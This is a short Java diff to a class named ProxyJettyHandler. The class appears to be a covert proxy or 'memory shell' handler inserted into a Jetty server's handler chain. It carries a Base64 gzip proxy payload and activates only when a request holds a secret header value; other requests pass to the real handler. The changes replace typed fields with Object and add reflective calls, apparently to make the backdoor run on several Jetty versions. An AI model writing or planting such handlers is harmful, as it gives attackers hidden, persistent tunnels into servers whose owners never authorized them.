@@ -36,11 +36,11 @@ public class ProxyJettyHandler implements Runnable, ThreadFactory {
     private static String proxyHttpGZipBase64;
     private static String headerName;
     private static String headerValue;
-    private Handler nextHandler;
+    private Object nextHandler;
 
-    private Request jettyRequest;
-    private Response jettyResponse;
-    private Callback jettyCallback;
+    private Object jettyRequest;
+    private Object jettyResponse;
+    private Object jettyCallback;
     private String jettyMethod;
     private String jettyToken;
     private Object jettySession;
@@ -79,7 +79,7 @@ public class ProxyJettyHandler implements Runnable, ThreadFactory {
         if (token == null || !get && (!post || token.length() == 0)
                 || header == null || headerValue == null || headerValue.length() == 0
                 || !header.contains(headerValue)) {
-            return nextHandler.handle(request, response, callback);
+            return ((Handler) nextHandler).handle(request, response, callback);
         }
 
         ProxyJettyHandler task = new ProxyJettyHandler();
@@ -105,7 +105,9 @@ public class ProxyJettyHandler implements Runnable, ThreadFactory {
             return;
         }
         if (nextHandler != null) {
-            nextHandler.handle(target, request, response, dispatch);
+            invokeMethod(nextHandler, "handle",
+                    new Class[]{String.class, HttpServletRequest.class, HttpServletResponse.class, int.class},
+                    new Object[]{target, request, response, dispatch});
         }
     }
 
@@ -116,7 +118,9 @@ public class ProxyJettyHandler implements Runnable, ThreadFactory {
             return;
         }
         if (nextHandler != null) {
-            nextHandler.handle(target, baseRequest, request, response);
+            invokeMethod(nextHandler, "handle",
+                    new Class[]{String.class, Request.class, HttpServletRequest.class, HttpServletResponse.class},
+                    new Object[]{target, baseRequest, request, response});
         }
     }
 
